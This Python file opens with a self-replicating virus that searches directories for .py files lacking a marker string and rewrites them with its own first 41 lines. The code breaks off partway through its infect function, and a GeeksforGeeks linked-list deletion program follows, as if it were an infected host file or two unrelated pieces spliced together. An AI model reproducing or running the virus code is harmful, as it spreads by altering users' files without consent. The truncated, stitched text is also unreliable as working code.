#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to delete all occurrences
# of a given key in linked list

# Link list node


class Node:
	def __init__(self, data):
		self.data = data
		self.next = None

# Given a reference (pointer to pointer)
# to the head of a list and an int,
# inserts a new node on the front of the list.


def push(head_ref, new_data):
	new_node = Node(0)
	new_node.data = new_data
	new_node.next = (head_ref)
	(head_ref) = new_node
	return head_ref

# Given a reference (pointer to pointer)
# to the head of a list and a key,
# deletes all occurrence of the given key
# in linked list


def deleteKey(head_ref, key):

	# Store head node
	temp = head_ref
	prev = None

	# If head node itself holds the key
	# or multiple occurrences of key
	while (temp != None and temp.data == key):
		head_ref = temp.next # Changed head
		temp = head_ref		 # Change Temp

	# Delete occurrences other than head
	while (temp != None):

		# Search for the key to be deleted,
		# keep track of the previous node
		# as we need to change 'prev.next'
		while (temp != None and temp.data != key):
			prev = temp
			temp = temp.next

		# If key was not present in linked list
		if (temp == None):
			return head_ref

		# Unlink the node from linked list
		prev.next = temp.next

		# Update Temp for next iteration of outer loop
		temp = prev.next
	return head_ref

# This function prints contents of linked list
# starting from the given node


def printList(node):
	while (node != None):
		print(node.data, end=" ")
		node = node.next


# Driver Code
if __name__ == '__main__':

	# Start with the empty list
	head = None

	head = push(head, 7)
	head = push(head, 2)
	head = push(head, 3)
	head = push(head, 2)
	head = push(head, 8)
	head = push(head, 1)
	head = push(head, 2)
	head = push(head, 2)

	key = 2 # key to delete

	print("Created Linked List: ")
	printList(head)

	# Function call
	head = deleteKey(head, key)
	print("\nLinked List after Deletion is: ")

	printList(head)

# This code is contributed by Arnab Kundu
# Time Complexity: O(n)
# Space Complexity: O(1)
